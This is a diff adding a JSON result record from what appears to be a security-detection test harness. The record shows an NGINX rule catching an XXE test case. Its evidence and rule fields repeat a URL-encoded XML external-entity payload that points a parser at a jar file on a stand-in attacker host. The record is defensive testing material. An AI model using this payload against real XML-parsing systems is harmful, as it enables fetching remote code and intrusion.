@@ -1,0 +1,17 @@
+{
+  "pattern_id": "XXE_JAR_001",
+  "test_id": "XXE_JAR_001-1769912942029-z1nlni",
+  "category": "xxe",
+  "detected": true,
+  "expected_detection": true,
+  "latency_ms": 42000,
+  "evidence": "02:29:02.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_JAR_001-1769912942029-z1nlni pattern_id=XXE_JAR_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E client=127.0.0.1",
+  "rule_name": "[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_JAR_001-1769912942029-z1nlni pattern_id=XXE_JAR_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E client=127.0.0.1",
+  "expected_rule": "[NGINX XXE Attack] DOCTYPE/ENTITY injection",
+  "rule_id": "",
+  "rule_match": true,
+  "matched_rule": "[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_JAR_001-1769912942029-z1nlni pattern_id=XXE_JAR_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E client=127.0.0.1",
+  "sent_at": 1769912984000,
+  "detected_at": 1769912942000,
+  "status": "passed"
+}
